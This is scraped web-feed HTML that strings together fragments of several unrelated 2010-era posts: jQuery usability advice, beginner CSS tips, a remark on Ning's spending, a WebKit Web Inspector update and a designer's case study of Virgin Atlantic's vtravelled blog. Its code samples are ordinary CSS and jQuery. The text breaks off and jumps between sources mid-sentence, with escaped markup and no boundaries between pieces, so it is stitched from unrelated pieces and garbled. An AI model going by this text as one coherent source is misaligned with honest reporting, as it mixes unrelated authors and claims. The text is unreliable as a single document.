href=\"http://www.delibarapp.com/\">Delibar</a> styles its tabs as bookmarks. The bold green draws the user’s attention. Delibar uses one-word labels to succinctly convey the product features and content behind the tabs. For example, the “Manage” tab leads to content that describes the numerous ways that users can manage their Delicious bookmarks using Delibar.</p><p><a href=\"http://www.delibarapp.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/delibar-tabs.jpg\" alt=\"Delibar-tabs in Usability Dos And Donts For Interactive Design\" width=\"495\" height=\"300\"></a><br> <em>Prominent tabs draw attention so that users do not miss important information.</em></p><h3>Don’t Take Control Away From Users</h3><p>One-page websites with smooth scrolling (horizontal and/or vertical) are a growing trend now. But don’t leave users stuck should they not want to use the navigation you provide.</p><p>Users who realize that the page extends beyond the fold will likely try to use their mouse or scroll bar to navigate down. Removing scrolling just shows how taking away basic browsing functionality (and thus taking control away from the user) can impair the overall experience. Users will feel that they are <strong>not in control of their own browsing</strong>.</p><p>If you are including page scrolling in your design, you could improve usability by providing keyboard navigation and shortcuts. This provide another option by which users can navigate the page. Now they’ll have the scroll bar, the mouse and the keyboard. jQuery for Designers has a tutorial on <a href=\"http://jqueryfordesigners.com/adding-keyboard-navigation/\">adding keyboard navigation using jQuery</a>.</p><p>When deciding how your design and its jQuery should function, think of how your choices might impede basic functionality and how users might react to that.</p><p>While providing links to navigate down the page, <a href=\"http://www.designinsocial.com/\">designinsocial</a> does not let users browse freely with their mouse or scroll bar. As you can see below, content exists below the fold and users will want to scroll down.</p><p><a href=\"http://www.designinsocial.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/designinsocial-control.jpg\" alt=\"Designinsocial-control in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"375\"></a><br> <em>Screenshot of designinsocial at 1024 x 768 pixel resolution.</em></p><h3>Use jQuery To Improve Form Validation</h3><p>jQuery can easily improve form validation and can be triggered either by the “Submit” button or by the user focusing off a field (<code>.blur()</code>). But remember that JavaScript form validation should never entirely replace server-side validation.</p><p>Using jQuery to help validate forms can have two very important benefits to users:</p><ol><li>The user won’t have to wait for the page to reload to learn that they made an error. Also, if the page has to reload before an error message is displayed, the user might assume that their submission was successful and overlook the message.</li><li>jQuery allows for easier and <strong>more effective error highlighting</strong>; for example, by changing the border and background color of relevant inputs or by using animation, such as a tooltip, to catch the user’s attention.</li></ol><p>Trevor Davis has an informative article entitled “<a href=\"http://trevordavis.net/blog/tutorial/ajax-forms-with-jquery/\">AJAX Forms with jQuery</a>,” which has some great tips on implementing form validation with jQuery.</p><p><a href=\"http://www.blueskyresumes.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/blueskyresumes-formvalidation.jpg\" alt=\"Blueskyresumes-formvalidation in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"445\"></a><br> <em>jQuery form validation for comments on Blue Sky Resumes.</em></p><p><a href=\"http://www.blueskyresumes.com/\">Blue Sky Resumes</a> uses jQuery on its blog comment form by changing the background and border color to highlight input fields with errors. A validation summary also appears above the form to further explain the error.</p><h3>Prevent Animations From Stacking</h3><p>One of the great features of jQuery is that it allows you to enhance a design by animating elements. This includes fading, changing colors and moving elements. One jQuery animation, often used to de-clutter an interface, is to hide information such as image captions and then display it on hover.</p><p><a href=\"http://www.cssbake.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/cssbake-animation.jpg\" alt=\"Cssbake-animation in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"375\"></a><br> <em>A CSS showcase uses jQuery animation to display an item’s title and rating when you roll over the screenshot.</em></p><p>One problem that many designers and developers overlook, though, is that such animations can quickly “stack.” When a page has many thumbnails, and a user quickly hovers over several at a time, then the animation will drag behind one by one, even though the user has stopped moving their mouse. Hovering over the four panels on <a href=\"http://www.druckbar.info/\">druckbar</a> demonstrates this problem.</p><p>You can use one of two solutions to save users from this hassle. The first is the <a href=\"http://api.jquery.com/stop/\">.stop()</a> function. When <code>.stop()</code> is called on an element, the currently running animation (if there is one) is immediately stopped. For instance, for an element hidden with <code>.slideUp()</code>, when <code>.stop()</code> is called, the element will be displayed but at a fraction of its previous height. Callback functions are not called.</p><p>CSSbake uses the following function in the example shown above to prevent animations from stacking:</p><pre>\n$(\"ol#gallery li\").hover(function () {\n$(\".thumb-meta\", this).stop().animate({ bottom: '0px' }, 400);\n},\nfunction () {\n$(\".thumb-meta\", this).stop().animate({ bottom: '-22px' }, 400);\n});\n</pre><p>Alternatively, you could use a jQuery plug-in such as <a href=\"http://cherne.net/brian/resources/jquery.hoverIntent.html\">hoverIntent</a>, which fires an animation only if the user’s mouse slows down enough, making it obvious that they are intentionally hovering over an element.</p><h3>Keep Content Animation To A Minimum</h3><p>Because JavaScript functions are so easy to implement with jQuery, many of us easily get carried away with animations, causing disruption for the user. Some websites use jQuery to load images as the user scrolls down the page, thus making the initial page load faster and allowing users to access content more quickly. <a href=\"http://mashable.com/\">Mashable</a>, a popular social media news website, does this. While this is great for users who have a slow Internet connection, it does have its drawbacks.</p><p>The fade-in animation tied into this technique can be quite distracting for the user. If a user is steeped in an article, the fade-in as they scroll down might break their flow. It would be more effective if the image loaded with no animation, ideally just before the image area came into the viewport, to avoid disruption.</p><p>So, think about how animation and other jQuery functionality will affect the user’s ability to concentrate on the main content.</p><h3>Conclusion</h3><p>jQuery’s ever-growing popularity has brought to light the wide range of possibilities it offers. The points discussed here are just a handful of the current trends in interactive design. As you would with any design element, <strong>think of how your decisions will affect users</strong>. Is the element easy to use? Are the processes easily understandable? If something goes wrong for the user, how might they react? Questions like these can help iron out errors, giving users a more solid interactive design and user experience.</p><h3>Showcase Of Websites With Effective jQuery</h3><p><a href=\"http://crushlovely.com/\">Crush + Lovely</a><br> Crush + Lovely uses jQuery to create a smooth scrolling effect when a navigation item is clicked. The user experience is enhanced through keyboard navigation: the left and right arrow keys scroll the page between sections.</p><p><a title=\"Crush + Lovely\" href=\"http://crushlovely.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/crushlovely-navigation.jpg\" alt=\"Crushlovely-navigation in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"375\"></a></p><p><a href=\"http://shauninman.com/pilation/\">Shaun Inman</a><br> Shaun Inman uses jQuery to highlight the item that the user is hovering over.

I’m learning new stuff all the time. I wanted to take a moment to put together this helpful list of CSS tips I wish I knew when I first started. Although many of these tips are common knowledge, I think you’ll find them helpful. At the very least I hope you’ll be nodding your head in agreement.</p><h2>Use Overflow: Hidden; to Clear Floats</h2><p>It wasn’t until recently that my style sheets were littered with unnecessary clearing floats that looked like the following.</p><div><table><tr><td><pre>1\n2\n3\n4\n5\n6\n</pre></td><td><pre style=\"font-family:monospace\"><span style=\"color:#6666ff\">.clear</span> <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">clear</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">both</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;columns&quot;</span><span style=\"color:#00aa00\">&gt;</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;column1&quot;</span><span style=\"color:#00aa00\">&gt;</span>&lt;/div<span style=\"color:#00aa00\">&gt;</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;column2&quot;</span><span style=\"color:#00aa00\">&gt;</span>&lt;/div<span style=\"color:#00aa00\">&gt;</span>\n&lt;div class<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;clear&quot;</span><span style=\"color:#00aa00\">&gt;</span>&lt;/div<span style=\"color:#00aa00\">&gt;</span>\n&lt;/div<span style=\"color:#00aa00\">&gt;</span></pre></td></tr></table></div><p>These clearing floats will work perfectly fine, but they are unnecessary. Instead you can just use overflow: hidden; on the parent div to clear the children elements, like in the following example.</p><div><table><tr><td><pre>1\n2\n3\n4\n5\n</pre></td><td><pre style=\"font-family:monospace\"><span style=\"color:#cc00cc\">#columns</span> <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">overflow</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">hidden</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;columns&quot;</span><span style=\"color:#00aa00\">&gt;</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;column1&quot;</span><span style=\"color:#00aa00\">&gt;</span>&lt;/div<span style=\"color:#00aa00\">&gt;</span>\n&lt;div id<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;column2&quot;</span><span style=\"color:#00aa00\">&gt;</span>&lt;/div<span style=\"color:#00aa00\">&gt;</span>\n&lt;/div<span style=\"color:#00aa00\">&gt;</span></pre></td></tr></table></div><h2>Group Elements Together</h2><p>One of the mantras of good coding 101 is to keep your code as simple and concise as possible. This helps its readability and performance. If you have a couple of elements that are doing the same thing, it’s wise to string them together. So instead of…</p><div><table><tr><td><pre>1\n2\n</pre></td><td><pre style=\"font-family:monospace\">h1 <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">color</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#cc00cc\">#333</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#000000;font-weight:bold\">font-weight</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">bold</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span>\nh2 <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">color</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#cc00cc\">#333</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#000000;font-weight:bold\">font-weight</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">bold</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span></pre></td></tr></table></div><p>You can group these elements like so…</p><div><table><tr><td><pre>1\n</pre></td><td><pre style=\"font-family:monospace\">h1<span style=\"color:#00aa00\">,</span> h2 <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">color</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#cc00cc\">#333</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#000000;font-weight:bold\">font-weight</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">bold</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span></pre></td></tr></table></div><h2>Comments Are Important</h2><p>Many of the sites that I create are 1-man projects. The last thing I want to do when I get into the flow of coding a design is to stop my progress to add some comments. However, when I go back to that code a year later I often have no idea what I was trying to accomplish. By adding logical comments throughout I can give myself very readable reminders about my code. And if, someone else gets the pleasure of looking through it they’ll have a better chance of understanding what I was trying to do.</p><h2>Add Some Base Styles to the Body</h2><p>This goes back to the code-less principle I discussed earlier. I like to get a nice base of font styles setup right on the body tag rather than redefining font-styles for every element. Here is an example of what I mean…</p><div><table><tr><td><pre>1\n2\n3\n</pre></td><td><pre style=\"font-family:monospace\">body <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">color</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#cc00cc\">#555</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#000000;font-weight:bold\">font</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">normal</span> <span style=\"color:#933\">.8em</span>/<span style=\"color:#933\">1.5em</span> helvetica<span style=\"color:#00aa00\">,</span> arial<span style=\"color:#00aa00\">,</span> <span style=\"color:#993333\">sans-serif</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span>\n&lt;!-- Then I can just set weight<span style=\"color:#00aa00\">,</span> and <span style=\"color:#000000;font-weight:bold\">size</span> by percentage --<span style=\"color:#00aa00\">&gt;</span>\nh2 <span style=\"color:#00aa00\">{</span> <span style=\"color:#000000;font-weight:bold\">font-size</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#933\"><span style=\"color:#cc66cc\">150</span>%</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#000000;font-weight:bold\">font-weight</span><span style=\"color:#00aa00\">:</span> <span style=\"color:#993333\">bold</span><span style=\"color:#00aa00\">;</span> <span style=\"color:#00aa00\">}</span></pre></td></tr></table></div><h2>Use Some Kind of CSS Reset</h2><p>One of the first difficult lessons that CSS noobs run into is the differences between browsers, especially when it comes to padding and margin styles. The best way to combat these inconsistencies is to start with some kind of CSS reset. There are a <a href=\"http://perishablepress.com/press/2007/10/23/a-killer-collection-of-global-css-reset-styles/\">ton out there</a>. Perhaps the most popular and the one I start with the most is<a href=\"http://meyerweb.com/eric/tools/css/reset/\"> Eric Meyer’s CSS Reset</a>. Sometimes I just put together my own.

After spending hours trying to make things look ‘ok’ in IE, you quickly come to realize just how much you loathe this piece. The best advice I can give on this subject is to fight through it, eventually you can tame the beast. <a href=\"http://24ways.org/2005/avoiding-css-hacks-for-internet-explorer\">Use hacks as little as possible</a>, and in really tough situations target IE specific styles with a conditional statement like this.</p><div><table><tr><td><pre>1\n2\n3\n</pre></td><td><pre style=\"font-family:monospace\">&lt;!--<span style=\"color:#00aa00\">[</span>if IE<span style=\"color:#00aa00\">]</span><span style=\"color:#00aa00\">&gt;</span>\n&lt;link rel<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;stylesheet&quot;</span> href<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;ie.css&quot;</span> type<span style=\"color:#00aa00\">=</span><span style=\"color:#ff0000\">&quot;text/css&quot;</span> /<span style=\"color:#00aa00\">&gt;</span>\n&lt;!<span style=\"color:#00aa00\">[</span>endif<span style=\"color:#00aa00\">]</span>--<span style=\"color:#00aa00\">&gt;</span></pre></td></tr></table></div><h2>Take Advantage of Progressive Enhancements</h2><p>Just because IE sucks doesn’t mean you can’t use technologies like CSS 3 and HTML 5 to add <a href=\"http://www.alistapart.com/articles/progressiveenhancementwithcss/\">progressive enhancements</a> to your site. So go ahead and add rounded corners in CSS, and box shadows (in moderation please!). And if you really want to get things looking pretty similar in IE here are <a href=\"http://www.catswhocode.com/blog/10-ways-to-make-internet-explorer-act-like-a-modern-browser\">10 Ways to Make Internet Explorer Act Like a Modern Browser</a>. Even so, it’s good to keep in mind that <a href=\"http://dowebsitesneedtolookexactlythesameineverybrowser.com/\">your site doesn’t need to look identical (not that it ever will) across every browser</a>.</p><h2>Writing Clean Code Makes Me Sleep Better</h2><p>This tip goes along the same lines as commenting throughout your code. Writing cleaner code helps with readability for yourself, and for those poor folks who may have to read your code down the road. How exactly to clean up your code however, can get a little nit picky. There is plenty of debate about which way is best, for instance should you use <a href=\"http://css-tricks.com/new-poll-hyphens-or-dashes/\">hyphens, underscores or camelCase</a>, others debate over whether to alphabetize or prioritize your properties, still others wrestle over whether to put css on <a href=\"http://neutroncreations.com/blog/single-line-vs-multi-line-css-plus-textmate-tips/\">one line or multiple lines</a>. For the record, I use hyphens, alphabetize, and single line, and that’s definitely the right way to do it :)</p><h2>Till I Learn Some New Stuff</h2><p>That’s it for now, but like I said I’m always learning new things. What sort of tips have you learned that you’d like to share. And feel free to add to the debate about what is the best way to write clean code (I’m sure the opinions are limitless).</p><p>Related posts:<ol><li><a href=\"http://www.myinkblog.com/2009/08/04/10-tips-for-writing-better-jquery-code/\" rel=\"bookmark\" title=\"Permanent Link: 10 Tips for Writing Better jQuery Code\">10 Tips for Writing Better jQuery Code</a></li><li><a href=\"http://www.myinkblog.com/2009/04/19/10-awesome-free-sans-serif-fonts/\" rel=\"bookmark\" title=\"Permanent Link: 10 Awesome Free Sans Serif Fonts\">10 Awesome Free Sans Serif Fonts</a></li><li><a href=\"http://www.myinkblog.com/2008/07/17/coding-website-header-navigation/\" rel=\"bookmark\" title=\"Permanent Link: Coding – Website Header &amp; Navigation\">Coding – Website Header &amp; Navigation</a></li></ol></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=jGJ12XlllXk:iLkdWqVljLM:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=jGJ12XlllXk:iLkdWqVljLM:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=jGJ12XlllXk:iLkdWqVljLM:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/MyInkBlog?a=jGJ12XlllXk:iLkdWqVljLM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/MyInkBlog?i=jGJ12XlllXk:iLkdWqVljLM:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/MyInkBlog/~4/jGJ12XlllXk\" height=\"1\" width=\"1\">"

The company has blown through $120MM of VC funding over six years, built up massive traffic, yet just had to slash and burn, and you’re saying that “traffic growth is no longer good enough”. How the hell was it <i>ever</i> good enough?</p>\n\n\n\t<p>Ning’s problem is not a lack of eyeballs but its inability to turn them into cash money to pay the bills.

It allows you to zoom into the areas of interest, expand the nested records and investigate their details. The Timeline organizes nesting based on event causation. So, if a mouse down event handler sets a timer, which upon firing loads a resource using XHR, which later evaluates the result when the resource becomes available; then all the events caused by the mouse down will be placed under the mouse down umbrella. Solid parts of the bars show synchronous time spent on the operation, while the semi-transparent part shows the time consumed by everything this event caused (not necessarily synchronously).</p>\n<p><b>Audits Panel</b></p>\n<p>Audit results provide you with hints on unused resources, caching optimizations, the number of resources to load per domain, image tag parameters and many other suggestions. We’d like to make the audits framework extensible so that everyone can contribute checks for various categories such as mobile browsing, security, and static code analysis.</p>\n<p><b>Dedicated Console Panel</b></p>\n<p>You can now enjoy a large and powerful inspector console in a dedicated panel. Note that you can use panel switching shortcuts such as Command-[ and Command-] as mentioned in one of the previous posts.</p>\n<p>To go along with these great new panels, there are also a ton of improvement to the other views that you know and love. My favorite is that you can now finally \"Edit as HTML\" in the DOM inspector. No more node ugliness.</p>\n<p><a href=\"http://webkit.org/blog/1091/more-web-inspector-updates/\">Read the full post for all of the goodness</a>.</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=9ZIoTlnk6Pc:9ogdKWRhN9Q:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=9ZIoTlnk6Pc:9ogdKWRhN9Q:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=9ZIoTlnk6Pc:9ogdKWRhN9Q:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=9ZIoTlnk6Pc:9ogdKWRhN9Q:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

I it’s something that a lot of web designers aspire to.</p>\n<p>Over the last few months, I was fortunate  enough to be given the opportunity to fulfill this dream.</p>\n<p>I was about to  write this post up over on my blog but Walter very kindly invited me  to share this case study with the much larger audience here on  Webdesigner Depot and across the Smashing Network.</p>\n<p>I’m no Elliot Jay Stocks and I certainly don’t claim to be, so when Virgin Atlantic got in touch with me back in November I was  surprised, humbled and extremely enthusiastic at the prospect of working  with the company on a new blog for the “vtravelled” website.<span></span></p>\n<p>Many people have since asked me why Virgin chose to work with me in  particular. The answer is that they found <a href=\"http://twitter.com/JohnONolan\">me on Twitter</a>, enjoyed my blog  posts and, most importantly, liked my work. This won’t end the debate  about the “value of Twitter” for some people but it certainly has  without a shadow of a doubt for me.</p>\n<p><img title=\"vt-blog-start\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/vt-blog-start1.jpg\" alt=\"\" width=\"615\" height=\"450\"></p>\n<p><br></p>\n<h1>The Beginning</h1>\n<p>In November 2009 vtravelled’s editor, Maxine Sheppard, got in  touch to ask if I would be available to design and develop a complete  blog for <a href=\"http://vtravelled.com/\">the vtravelled website</a> (Virgin’s new online travel community and web app). Meetings were  arranged and after a week or so I got the green light for the project.</p>\n<p>I’ve done some work for big companies before, including Ubisoft,  but this was really my first time getting into the corporate culture of  the industry. To be totally honest it’s really not as scary as people  make it out to be, though I can imagine that there is some variation  in people’s experiences.</p>\n<p>Virgin Atlantic has managed to put together a truly great team at  vtravelled; as a result, not only was the company very easy to work  with but it was great fun, too.</p>\n<p><a href=\"http://netdna.webdesignerdepot.com/uploads/virgin/thebase.jpg\"><img title=\"The Base\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/thebase.jpg\" alt=\"Virgin Atlantic HQ\" width=\"615\" height=\"461\"></a></p>\n<p><em>The building is as wide as it is long, it even has its own set of traffic lights.</em></p>\n<p>Bizarrely, I think the most daunting (perhaps awe-inspiring) part of  the whole process was going to Virgin Atlantic’s headquarters for  meetings.</p>\n<p>Something about driving up to a building that can (and does)  physically contain both offices and actual aeroplanes is pretty special.  The entrance to the building contains the company’s own gift store, and after a long  walk you end up in the atrium, which is directly adjacent to large  sections of Boeing aircraft that are used to train cabin crew.</p>\n<p>At the first meeting I asked the head of vtravelled, Lysette Gauna,  (as a joke) if all of the design awards lining the vtravelled office  were hers. The answer was, “Yes, but I keep most of them at home.” D’oh! Time to be really afraid.</p>\n<p><br></p>\n<h1>The Brief</h1>\n<p><a href=\"http://netdna.webdesignerdepot.com/uploads/virgin/vt-office.jpg\"><img title=\"VTravelled Offices\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/vt-office.jpg\" alt=\"VTravelled Offices\" width=\"616\" height=\"336\"></a></p>\n<p><em>The vtravelled offices are bright and creative and the whole back wall is a chalk board!</em></p>\n<p>The brief was fairly straightforward: vtravelled is a big web  application and community for travel lovers but it’s still being actively  developed. The team needed a way to put out editorial content and engage with users on social networks. A blog was the obvious answer.</p>\n<p>I wanted to make sure that I really nailed the direction it was looking to  go in on the design side, so I came up with a slightly different implementation of using mood boards; I called them <a href=\"http://john.onolan.org/getting-creative-mood-cards/\">Moo’d cards</a>.  The idea was simple but effective: I took 100 samples of great design  work that I’d collected and printed them on 100 MiniCards from Moo.com.</p>\n<p><a href=\"http://netdna.webdesignerdepot.com/uploads/virgin/moodcards.jpg\"><img title=\"Moo&#39;d Cards\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/moodcards.jpg\" alt=\"Mood Cards\" width=\"615\" height=\"374\"></a></p>\n<p><em>Some  of the Moo’d cards that were used.</em></p>\n<p>We looked through all of them during the kick-off meeting and eight  cards were selected to represent the sort of style that the team was looking for to appeal to vtravelled’s user base.</p>\n<p>If you  haven’t tried this technique, I highly recommend it; It’s a great  way to discover client expectations of design. I’ve since <a href=\"http://john.onolan.org/mood-cards-unleashed/\">released all the  source files for the Moo’d cards</a> as an OpenSource project,  including web and iPhone versions.</p>\n<p>Once we established an overall style (minimalist, in keeping with  vtravelled branding but creative and different from the main website)  and an overall direction (a magazine-style blog, with plenty of avenues  for user interaction), it was up to me to get started.</p>\n<p><br></p>\n<h1>The Design Process</h1>\n<p>The design process when working with a large company is pretty  similar to any other: starting with wireframes, then developing mockups.</p>\n<p>The  main difference comes at the feedback stage: two or three people had to  review and sign off at each stage, at which point they took much larger issues  into consideration. For example, Virgin is particularly sensitive to how  its brand is portrayed. Anything the company does has to fit in with  its morals, standards and qualities.</p>\n<p>After establishing the structure of the website, it was time to move  on to actually creating the design.</p>\n<p>This was about a 30-hour process (for the home page) which moved through several interesting phases  leading up to the end result. Luckily, in anticipation of writing this post, I  recorded a screencast of almost every minute of design time and  compressed it into a three-minute video.</p>\n<p>All in all, the design process took place over about six weeks.</p>\n<p>\n<iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://vimeo.com/moogaloop.swf?clip_id%3D10800049%26server%3Dvimeo.com%26show_title%3D1%26show_byline%3D1%26show_portrait%3D0%26color%3D00ADEF%26fullscreen%3D1&amp;width=615&amp;height=346\" width=\"615\" height=\"346\"></iframe>\n</p>\n<p><em><a href=\"http://vimeo.com/10800049\">This video</a> was created with <a href=\"http://araelium.com/screenflick/\">ScreenFlick</a> ($25) for Mac  OS X, recorded at 1 frame per second, and edited in iMovie.</em></p>\n<p><br></p>\n<h1>The Development Process</h1>\n<p>Once final-signoff for the design had been achieved, the development process began  and lasted approximately another six weeks.</p>\n<p>Virgin Atlantic uses IE6 in its corporate offices, so this was a big  consideration in developing the front end. The website had to degrade  gracefully enough to accommodate this browser so that it was at the very  least functional. Once again, because of the great team at vtravelled, I  was also permitted to use progressive enhancements with CSS3 for newer  browsers.</p>\n<p>Turning the front-end code into a custom WordPress theme was the next  step. There were a few special considerations here to make the website  as powerful as possible.</p>\n<p>I started with the WooThemes “WooFramework”  to allow a high level of back-end customization but, in the end, it was  modified and customized so much that the vtravelled blog pretty much  ended up with its own custom system. It was important to take into consideration that a lot of people would be  administrating the blog, so it needed to be as flexible as possible in  all areas.</p>\n<p>Finally, the theme needed strong pagination and  light-hearted error messages on the <a href=\"http://blog.vtravelled.com/asfsdfsdfsd\">404</a> and <a href=\"http://blog.vtravelled.com/?s=superman\">search</a> pages that  would reflect the friendly nature of the brand.</p>\n<p><img title=\"vt-blog-mid\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/vt-blog-mid1.jpg\" alt=\"\" width=\"615\" height=\"450\"></p>\n<p><br></p>\n<h1>A Little Trickle Tweet</h1>\n<p><a href=\"http://netdna.webdesignerdepot.com/uploads/virgin/tricklesketch.jpg\"><img title=\"TrickleTweet Sketch\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/tricklesketch.jpg\" alt=\"TrickleTweet Sketch\" width=\"615\" height=\"461\"></a></p>\n<p><em>The first sketch of the Trickle Tweet plugin.</em></p>\n<p>I’m pretty handy when it comes to writing PHP for WordPress but when I need something totally custom built, there’s only one guy I  turn to: my partner in crime, <a href=\"http://twitter.com/japh\">Japh  Thomson</a>.</p>\n<p>During the design phase, I had sketched out an idea during a meeting  that went over really well with the vtravelled team. The idea was to use  the Helvetica-Man branding that existed throughout the vtravelled website  and social media profiles for a stream of live conversation about  travel.</p>\n<p><a href=\"http://netdna.webdesignerdepot.com/uploads/virgin/tricklefinal.jpg\"><img title=\"TrickleTweet Final\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/tricklefinal.jpg\" alt=\"TrickleTweet Final\" width=\"615\" height=\"461\"></a></p>\n<p><em>The final version of the TrickleTweet plugin.</em></p>\n<p>Japh had already developed a piece of code with the Twitter API,  called <a href=\"http://trickletweet.com/\">Trickle Tweet</a> which allows  you to search for any term on Twitter and view a live (up-to-the-second) stream of the latest mentions of it.</p>\n<p>I was permitted to sub-contract Japh and he was commissioned to  modify his script to become a completely custom WordPress plugin for  vtravelled. This has turned out to really be the piece-de-resistance of the website.</p>\n<p><br></p>\n<h1>Launch and Conclusion</h1>\n<p>Launching a website for a big company is a little different than a  normal launch. I had to liase with vtravelled’s development company  fo proper server settings and to remove password protection to  the sub-domain at the right time.</p>\n<p>I had to liase with the advertising  company to ensure that the right ad codes were installed, and  I had to go through a mad 24-hour period of beta-testing, bug-fixing and reviewing performance.</p>\n<p>In the end, we soft-launched the blog at about mid-day on Tuesday  and started the announcements and press releases a few hours later.  Fingers crossed, nothing has gone wrong so far and the website has  gotten a very positive response on Twitter, which was reflected in the  blog’s day-one traffic levels and some other features around the web.</p>\n<p>As with any website, there are improvements can be made and features will  develop over time, but I’m pretty pleased with how v1.0 of the <a rel=\"nofollow\" href=\"http://blog.vtravelled.com/\"> vtravelled blog</a> has turned out.</p>\n<p>Working with Virgin Atlantic has been one of the absolute highlights  of my career so far, and I’m very pleased to be working with the company again at the moment on a few other pieces of design work.</p>\n<p>I still suck at estimating time though; we initially thought the  whole blog design and build would take four weeks!</p>\n<p><img title=\"vt-blog-final\" src=\"http://netdna.webdesignerdepot.com/uploads/virgin/vt-blog-final1.jpg\" alt=\"\" width=\"615\" height=\"450\"></p>\n<p><br></p>\n<h1>Credits</h1>\n<ul>\n<li>Post image by <a title=\"Link to sebas&#39; photostream\" rel=\"dc:creator  cc:attributionURL\" href=\"http://www.flickr.com/photos/sebas/\">sebas</a></li>\n<li>Virgin Atlantic HQ photo by <a title=\"User:MilborneOne\" rel=\"dc:creator cc:attributionURL\" 